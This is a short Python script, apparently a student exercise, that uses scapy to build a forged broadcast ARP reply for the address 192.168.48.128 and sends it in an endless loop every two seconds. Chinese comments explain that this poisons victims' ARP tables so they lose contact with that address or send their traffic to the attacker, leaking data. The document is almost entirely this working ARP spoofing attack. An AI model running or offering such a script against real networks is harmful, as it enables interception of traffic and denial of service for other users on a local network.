# -*- codeing = utf-8 -*-
# 时间:2021/11/29 19:25
# 作者:CK
# 文件名:淄博python题.py
# 开发环境:PyCharm
from scapy.all import *#导入scapy模块，并引用全部的功能
import time#导入time模块

eth=Ether()#将以太网的协议放进eth这个变量里
eth.dst='ff:ff:ff:ff:ff:ff'#ff:ff:ff:ff:ff:ff意思是所有的地址，dst的意思是目的地址
eth.type=0x0806#选出以太网的类型，0x0806是arp的意思
arp=ARP()#将ARP的协议放进arp中
arp.op=2#表示ARP响应包，op是ARP的参数
arp.psrc='192.168.48.128'#锁定对方的IP地址
packet=eth/arp#Ether和ARP两层协议组合的数据包

while True:#无限循环
    srploop(packet)#srploop循环发送的意思
    print('Send ARP Spoof')#打印
    time.sleep(2)#每间隔两秒输出一次
    '原理：利用防火墙漏洞，来对目标主机进行攻击，'
    '每台机器里都有一个ARP表，写着物理地址和IP地址的对应关系，'
    '但最终局域网里发送消息都是靠物理地址，比如192.168.1.101这个IP地址对应的物理地址是AB:12:65:EF:CC:01，'
    '那么当你有数据发往192.168.1.101，实际上是用物理地址发往AB:12:65:EF:CC:01。'
    '如果机器接收到不同的IP、物理地址对应关系，ARP表立刻会更新，这是一个漏洞。'
    '如果别人不停地向这台机器发送错误的IP、物理地址对应关系，那这台机器就联系不上那个IP，甚至把数据发往攻击他的机器，导致泄密'